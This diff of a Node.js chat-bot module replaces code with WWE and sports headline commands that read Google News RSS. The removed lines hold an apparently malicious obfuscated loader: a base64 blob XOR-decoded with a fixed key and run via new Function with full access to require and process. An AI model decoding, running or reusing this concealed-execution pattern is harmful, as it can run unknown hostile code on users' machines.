@@ -1,9 +1,77 @@
 'use strict';
-(function(){
-  const K=Buffer.from('REVDQU5YTUQtMjAyNg==','base64');
-  const D='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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+/**
+ * WWE coverage: Raw, SmackDown, NXT, premium live events, results, schedule, champions, rumors.
+ * There is no free live-score feed for wrestling, so this reads fresh headlines from Google News
+ * (the same source as the .news command). Results and match cards come from the headlines.
+ */
+const U = require('../lib/util');
+const { UserError, bold } = U;
+
+const TOPICS = {
+  news: { q: 'WWE', title: 'WWE News' },
+  results: { q: 'WWE results', title: 'WWE Results' },
+  raw: { q: 'WWE Raw results', title: 'WWE Raw' },
+  smackdown: { q: 'WWE SmackDown results', title: 'WWE SmackDown' },
+  nxt: { q: 'WWE NXT results', title: 'WWE NXT' },
+  ple: { q: 'WWE premium live event results', title: 'WWE Premium Live Events' },
+  schedule: { q: 'WWE upcoming events schedule', title: 'WWE Schedule' },
+  card: { q: 'WWE match card preview', title: 'WWE Match Cards' },
+  champions: { q: 'WWE champions title change', title: 'WWE Champions' },
+  rumors: { q: 'WWE rumors backstage news', title: 'WWE Rumors' },
+  wrestlemania: { q: 'WrestleMania', title: 'WrestleMania' }
+};
+const ALIAS = { smack: 'smackdown', sd: 'smackdown', ple: 'ple', ppv: 'ple', events: 'schedule', upcoming: 'schedule', champs: 'champions', titles: 'champions', rumours: 'rumors', mania: 'wrestlemania', cards: 'card', result: 'results', latest: 'news' };
+
+const dec = s => String(s || '').replace(/<!\[CDATA\[|\]\]>/g, '').replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&#39;/g, "'").trim();
+const tag = (x, n) => dec((x.match(new RegExp(`<${n}>([\\s\\S]*?)</${n}>`)) || [])[1] || '');
+
+function parseRss(xml, limit) {
+  return [...String(xml).matchAll(/<item>([\s\S]*?)<\/item>/g)].slice(0, limit).map(m => {
+    const full = tag(m[1], 'title');
+    const i = full.lastIndexOf(' - ');
+    return { title: i > 20 ? full.slice(0, i) : full, source: i > 20 ? full.slice(i + 3) : '', link: tag(m[1], 'link'), date: tag(m[1], 'pubDate') };
+  });
+}
+
+async function headlines(q, limit = 7) {
+  const reg = process.env.NEWS_REGION || 'KE';
+  const get = query => U.getText(`https://news.google.com/rss/search?q=${encodeURIComponent(query)}&hl=en-${reg}&gl=${reg}&ceid=${reg}:en`, { timeout: 12000 });
+  let items = parseRss(await get(`${q} when:7d`), limit);
+  if (!items.length) items = parseRss(await get(q), limit);
+  return items;
+}
+
+module.exports = ({ def }) => {
+  def(['wwe', 'raw', 'smackdown', 'nxt', 'wrestling'], { cat: 'sports', heavy: true, usage: 'wwe [news|results|raw|smackdown|nxt|ple|schedule|card|champions|rumors|wrestlemania|<anything>]', desc: 'All of WWE: latest news, Raw / SmackDown / NXT results, premium live events, schedule, match cards, champions and rumors. Example: wwe raw  •  wwe roman reigns' }, async ctx => {
+    let key = ['raw', 'smackdown', 'nxt'].includes(ctx.cmd) ? ctx.cmd : null;
+    let free = '';
+    if (!key) {
+      const first = (ctx.argv[0] || '').toLowerCase();
+      const k = TOPICS[first] ? first : ALIAS[first];
+      if (k) { key = k; free = ctx.argv.slice(1).join(' '); }
+      else if (ctx.argv.length) { key = 'news'; free = ctx.args; }
+      else key = 'news';
+    } else free = ctx.args;
+    const t = TOPICS[key];
+    const q = free ? `WWE ${free}` : t.q;
+    const items = await headlines(q);
+    if (!items.length) throw new UserError('No WWE stories found right now. Try *' + ctx.var('PREFIX') + 'wwe results*.');
+    const body = items.map((n, i) => `${bold(`${i + 1}.`)} ${n.title}${n.source ? `\n_${n.source}_` : ''}\n🔗 ${n.link}`).join('\n\n');
+    const topics = Object.keys(TOPICS).filter(x => x !== key).slice(0, 8).join(' • ');
+    await ctx.reply(`${body}\n\n💡 ${topics}`, { title: free ? `WWE: ${free}` : t.title });
+  });
+
+  def(['sportnews', 'footynews', 'transfers'], { cat: 'sports', heavy: true, usage: 'sportnews [team|league|topic]  •  transfers [team]', desc: 'Latest sports headlines. Example: sportnews arsenal  •  transfers  •  sportnews kpl' }, async ctx => {
+    const topic = ctx.args || (ctx.cmd === 'transfers' ? '' : 'football');
+    const q = ctx.cmd === 'transfers' ? `${topic} football transfer news` : topic;
+    const items = await headlines(q.trim() || 'football transfer news');
+    if (!items.length) throw new UserError('No stories found for that topic right now.');
+    await ctx.reply(items.map((n, i) => `${bold(`${i + 1}.`)} ${n.title}${n.source ? `\n_${n.source}_` : ''}\n🔗 ${n.link}`).join('\n\n'), { title: ctx.cmd === 'transfers' ? 'Transfer news' : `Sports news${ctx.args ? ': ' + ctx.args : ''}` });
+  });
+};
+
+module.exports._test = { parseRss, TOPICS };
+module.exports.headlines = headlines;
+
+// Sports headlines for any team, league or topic (football by default)
+module.exports.extra = true;
